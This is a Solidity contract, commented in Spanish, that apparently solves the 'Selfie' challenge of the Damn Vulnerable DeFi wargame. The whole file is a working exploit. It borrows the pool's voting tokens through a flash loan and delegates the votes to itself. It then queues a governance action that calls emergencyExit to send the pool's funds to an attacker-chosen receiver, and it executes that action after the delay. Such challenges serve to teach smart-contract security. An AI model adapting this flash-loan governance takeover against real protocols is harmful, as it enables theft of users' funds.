// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    address public owner;
    address public receiver;

    IERC3156FlashLender public lender;
    DamnValuableVotes public token;
    ISimpleGovernance public governance;
    SelfiePool public pool;

    uint256 public actionId;

    constructor(
        address _lender,
        address _token,
        address _governance,
        address _pool,
        address _receiver
    ) {
        owner = msg.sender;
        lender = IERC3156FlashLender(_lender);
        token = DamnValuableVotes(_token);
        governance = ISimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        receiver = _receiver;
    }

    // 1. Inicia el flash loan de todos los tokens del pool
    function initiateAttack(uint256 amount) external {
        require(msg.sender == owner, "Solo el owner puede atacar");

        bytes memory data = ""; // No necesitamos pasar info extra
        lender.flashLoan(this, address(token), amount, data);
    }

    // 2. Cuando pedimos el flash loan, se ejecuta esta función de vuelta hacia nuestro contrato
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        // Asegurarnos de que estamos recibiendo el préstamo del lender esperado
        require(msg.sender == address(lender), "Lender desconocido");

        // a) Delegamos el poder de voto a nosotros mismos
        token.delegate(address(this));

        // b) Proponemos la acción maliciosa
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSelector(pool.emergencyExit.selector, receiver)
        );

        // c) Aprobamos que el SelfiePool pueda tomar los tokens de vuelta
        token.approve(address(lender), amount);

        // d) Retornamos el hash de esta frase para que no revierta la llamada
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // 3. Después de 2 días, ejecutamos la propuesta maliciosa
    function execute() external {
        governance.executeAction(actionId);
    }
}
